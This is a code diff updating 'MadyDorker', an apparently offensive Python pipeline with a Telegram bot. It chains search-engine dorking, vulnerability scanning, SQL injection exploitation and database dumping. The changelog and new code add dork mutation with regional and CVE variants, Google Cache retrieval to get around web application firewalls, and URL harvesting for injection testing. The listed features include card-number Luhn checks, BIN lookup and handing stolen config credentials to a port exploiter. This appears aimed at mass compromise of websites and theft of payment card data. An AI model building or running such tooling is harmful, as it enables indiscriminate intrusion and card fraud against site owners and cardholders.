@@ -1,7 +1,18 @@
 """
-MadyDorker v3.1 — Main Pipeline & Telegram Bot
+MadyDorker v3.2 — Main Pipeline & Telegram Bot
 
 Unified pipeline: Dorker → Scanner → Exploiter → Dumper → Reporter
+
+Improvements v3.2:
+  - Dork mutation engine (regional, CVE, operator swaps)
+  - Google Cache bypass for WAF-protected targets
+  - WAF bypass arsenal (chunked transfer, HPP, Unicode normalization)
+  - Second-order SQLi detection
+  - Luhn validation at extraction time
+  - BIN lookup for card network verification
+  - Cross-database pivoting
+  - Config file credential parsing → port exploiter handoff
+  - Binary search blind extraction optimization
 
 Improvements v3.1:
   - SQLite persistence (replaces JSON files)
@@ -146,6 +157,13 @@ from crlf_scanner import CRLFScanner, CRLFResult
 from auto_dumper import AutoDumper, ParsedDumpData
 from dump_parser import DumpParser
 
+# v3.2 Advanced techniques
+try:
+    from dork_mutator import DorkMutator
+    HAS_DORK_MUTATOR = True
+except ImportError:
+    HAS_DORK_MUTATOR = False
+
 
 class MadyDorkerPipeline:
     """The main v3.1 pipeline: Generate → Search → Detect → Exploit → Dump → Report."""
@@ -164,6 +182,9 @@ class MadyDorkerPipeline:
             custom_dork_file=self.config.custom_dork_file,
             priority_dork_file=self.config.priority_dork_file or None,
         )
+        # v3.2: Dork mutation engine for enhanced dork generation
+        self.dork_mutator = DorkMutator() if HAS_DORK_MUTATOR else None
+        
         self.searcher = MultiSearch(
             proxies=self._load_proxies(),
             engines=self.config.engines,
@@ -1876,6 +1897,33 @@ class MadyDorkerPipeline:
                         except Exception as e:
                             logger.debug(f"[DirFuzz] Failed for {url[:60]}: {e}")
 
+                    # Step 3d: Google Cache bypass (v3.2) — try fetching from cache to bypass WAFs
+                    if waf_name and self.dork_mutator and HAS_DORK_MUTATOR:
+                        try:
+                            cache_urls = self.dork_mutator.get_cache_urls(url)
+                            for cache_url in cache_urls[:2]:
+                                try:
+                                    async with session.get(
+                                        cache_url, ssl=False,
+                                        timeout=aiohttp.ClientTimeout(total=8),
+                                    ) as resp:
+                                        if resp.status == 200:
+                                            cache_html = await resp.text()
+                                            # Extract real URLs from cached page
+                                            extracted = self.dork_mutator.extract_urls_from_cache(
+                                                cache_html, domain
+                                            )
+                                            for ex_url in extracted:
+                                                discovered_param_urls.add(ex_url)
+                                            if extracted:
+                                                logger.info(f"[Cache] Found {len(extracted)} URLs "
+                                                           f"from cache for {domain}")
+                                            break
+                                except Exception:
+                                    continue
+                        except Exception as e:
+                            logger.debug(f"[Cache] Cache bypass failed: {e}")
+
                     # Step 4: SQLi Testing (now with cookie/header/POST injection + WAF bypass)
                     # Also test param URLs discovered by the recursive crawler
                     if self.config.sqli_enabled:
@@ -3183,6 +3231,29 @@ class MadyDorkerPipeline:
             logger.info(f"Dorks sorted by effectiveness score")
         elif self.config.dork_shuffle:
             random.shuffle(dorks)
+
+        # v3.2: Dork mutation — generate variants (regional, CVE, mutated)
+        if self.dork_mutator and getattr(self.config, 'dork_mutation_enabled', True):
+            try:
+                original_count = len(dorks)
+                # Take top 100 dorks and generate mutations
+                seed_dorks = dorks[:100]
+                mutated = self.dork_mutator.mutate_batch(seed_dorks, variants_per_dork=2)
+                regional = self.dork_mutator.generate_regional_dorks(seed_dorks[:30], tier="high_value")
+                cve_dorks = self.dork_mutator.generate_cve_dorks(max_per_cve=3)
+
+                # Merge mutated + regional + CVE dorks, deduplicate
+                new_dorks = set(dorks)
+                new_dorks.update(mutated)
+                new_dorks.update(regional)
+                new_dorks.update(cve_dorks)
+                dorks = list(new_dorks)
+                random.shuffle(dorks)
+                logger.info(f"[DorkMutator] {original_count} → {len(dorks)} dorks "
+                           f"(+{len(mutated)} mutated, +{len(regional)} regional, "
+                           f"+{len(cve_dorks)} CVE)")
+            except Exception as e:
+                logger.debug(f"[DorkMutator] Mutation failed: {e}")
 
         # --- Per-cycle dork batching: only process a slice of dorks per cycle ---
         _dorks_per_cycle = getattr(self.config, "dorks_per_cycle", 500)
